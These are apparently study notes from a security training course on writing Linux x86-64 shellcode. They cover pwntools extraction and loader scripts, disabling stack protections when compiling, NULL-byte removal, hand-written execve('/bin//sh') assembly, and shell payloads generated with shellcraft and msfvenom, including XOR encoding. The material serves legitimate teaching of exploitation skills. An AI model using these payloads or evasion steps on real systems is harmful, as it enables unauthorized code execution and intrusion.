	http://shell-storm.org/shellcode/

# Installation
```bash
sudo pip3 install pwntools
sudo dnf install -y python3-pwntools

$ pwn asm 'push rax'  -c 'amd64'
   0:    50                       push   eax
```
# Extract shellcode
```python
>>> from pwn import *
>>> file = ELF('helloworld')
>>> file.section(".text").hex()
'48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05'
```
## shellcoder.py
```python
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

file = ELF(sys.argv[1])
shellcode = file.section(".text")
print(shellcode.hex())

print("%d bytes - Found NULL byte" % len(shellcode)) if [i for i in shellcode if i == 0] else print("%d bytes - No NULL bytes" % len(shellcode))
```
### run
```bash
la1n23@htb[/htb]$ python3 shellcoder.py helloworld

48be0020400000000000bf01000000ba12000000b8010000000f05b83c000000bf000000000f05
```
## shellcoder.sh
```bash
#!/bin/bash

for i in $(objdump -d $1 |grep "^ " |cut -f2); do echo -n $i; done; echo;
```
# Loading shellcode
```python
>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> run_shellcode(unhex('4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05')).interactive()

Hello HTB Academy!
```
## loader.py
```python
#!/usr/bin/python3

import sys
from pwn import *

context(os="linux", arch="amd64", log_level="error")

run_shellcode(unhex(sys.argv[1])).interactive()
```
run
```bash
la1n23@htb[/htb]$ python3 loader.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05'

Hello HTB Academy!
```
# Debugging
## assembler.py
```python
#!/usr/bin/python3

import sys, os, stat
from pwn import *

context(os="linux", arch="amd64", log_level="error")

ELF.from_bytes(unhex(sys.argv[1])).save(sys.argv[2])
os.chmod(sys.argv[2], stat.S_IEXEC)
```
### create elf and run
```bash
la1n23@htb[/htb]$ python assembler.py '4831db66bb79215348bb422041636164656d5348bb48656c6c6f204854534889e64831c0b0014831ff40b7014831d2b2120f054831c0043c4030ff0f05' 'helloworld'

la1n23@htb[/htb]$ ./helloworld

Hello HTB Academy!
```
## GCC
```c
#include <stdio.h>

int main()
{
    int (*ret)() = (int (*)()) "\x48\x31\xdb\x66\xbb\...SNIP...\x3c\x40\x30\xff\x0f\x05";
    ret();
}
```
### run 
```bash
la1n23@htb[/htb]$ gcc helloworld.c -o helloworld
la1n23@htb[/htb]$ gdb -q helloworld
```
### run and bypass memory protection
```bash
la1n23@htb[/htb]$ gcc helloworld.c -o helloworld -fno-stack-protector -z execstack -Wl,--omagic -g --static
la1n23@htb[/htb]$ ./helloworld

Hello HTB Academy!
```
# Shellcoding Requirements

1. Does not contain variables (no .data or .bss)
2. Does not refer to direct memory addresses
3. Does not contain any NULL bytes `00`
## Remove variables
1. Moving immediate strings to registers
2. Pushing strings to the Stack, and then use them
```nasm
mov rbx, 'y!'
push rbx
mov rbx, 'B Academ'
push rbx
mov rbx, 'Hello HT'
push rbx
mov rbx, 0x00
push rbx
mov rsi, rsp
```
## Remove addresses
If we ever had any calls or references to direct memory addresses, we can fix that by:
1. Replacing with calls to labels or rip-relative addresses (for `calls` and `loops`)
2. Push to the Stack and use `rsp` as the address (for `mov` and other assembly instructions)
## Remove NULL 
We must use registers that match our data size
```bash
la1n23@htb[/htb]$ pwn asm 'xor rax, rax' -c 'amd64'

4831c0

# from this
la1n23@htb[/htb]$ pwn asm 'mov rax, 1' -c 'amd64'

48c7c001000000

# to this
la1n23@htb[/htb]$ pwn asm 'mov al, 1' -c 'amd64'

b001
```

# Shellcode Tools
## Manual Shell shellcode creation
```
execve("/bin//sh", ["/bin//sh"], NULL)
```
So, we'll set our arguments as:
1. `rax` -> `59` (`execve` syscall number)
2. `rdi` -> `['/bin//sh']` (pointer to program to execute)
3. `rsi` -> `['/bin//sh']` (list of pointers for arguments)
4. `rdx` -> `NULL` (no environment variables)
We added an extra / in '/bin//sh' so that the total character count is 8, which fills up a 64-bit register.
```nasm
_start:
    mov al, 59          ; execve syscall number
    xor rdx, rdx        ; set env to NULL
    push rdx            ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack 
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push rdx            ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    syscall
```
print
```bash
la1n23@htb[/htb]$ python3 shellcoder.py sh

b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
27 bytes - No NULL bytes
```
## Shellcraft
Tool for creating shellcode for different syscalls
```bash
la1n23@htb[/htb]$ pwn shellcraft -l 'amd64.linux'

...SNIP...
amd64.linux.sh

la1n23@htb[/htb]$ pwn shellcraft amd64.linux.sh

6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05

la1n23@htb[/htb]$ pwn shellcraft amd64.linux.sh

$

# custom syscall arguments
la1n23@htb[/htb]$ python3

>>> from pwn import *
>>> context(os="linux", arch="amd64", log_level="error")
>>> dir(shellcraft)

[...SNIP... 'execve', 'exit', 'exit_group', ... SNIP...]

>>> syscall = shellcraft.execve(path='/bin/sh',argv=['/bin/sh']) # syscall and args
>>> asm(syscall).hex() # print shellcode

'48b801010101010101015048b82e63686f2e726901483104244889e748b801010101010101015048b82e63686f2e7269014831042431f6566a085e4801e6564889e631d26a3b580f05'
```
## [[metasploit]] msfvenom
```bash
la1n23@htb[/htb]$ msfvenom -l payloads | grep 'linux/x64'

linux/x64/exec                                      Execute an arbitrary command
...SNIP...

la1n23@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex'

No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of hex file: 96 bytes
6a3b589948bb2f62696e2f736800534889e7682d6300004889e652e80300000073680056574889e60f05
```
### encoding
```bash
la1n23@htb[/htb]$ msfvenom -l encoders

Framework Encoders [--encoder <value>]
======================================
    Name                          Rank       Description
    ----                          ----       -----------
    cmd/brace                     low        Bash Brace Expansion Command Encoder
    cmd/echo                      good       Echo Command Encoder

<SNIP>

# create and encoding
la1n23@htb[/htb]$ msfvenom -p 'linux/x64/exec' CMD='sh' -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor'

# encode existing one
msfvenom -p - -a 'x64' --platform 'linux' -f 'hex' -e 'x64/xor' < shell.bin
```